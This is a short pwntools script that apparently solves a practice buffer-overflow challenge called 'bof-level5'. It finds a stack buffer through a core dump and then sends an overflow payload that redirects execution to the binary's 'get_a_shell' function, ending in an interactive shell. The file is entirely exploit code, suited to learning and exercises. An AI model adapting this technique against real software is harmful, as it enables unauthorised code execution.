#!/usr/bin/env python

from pwn import *
import os
p = process('./bof-level5')
e = ELF('./bof-level5')

buf = 'A' * 0x90
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buff_addr = c.stack.find(buf)

get_a_shell = e.symbols['get_a_shell']

print(buff_addr, get_a_shell)
buf = 'AAA' + p32(get_a_shell) + 'A' * 0x7c + p32(buff_addr)

p = process('./bof-level5')
p.sendline(buf)
p.interactive()

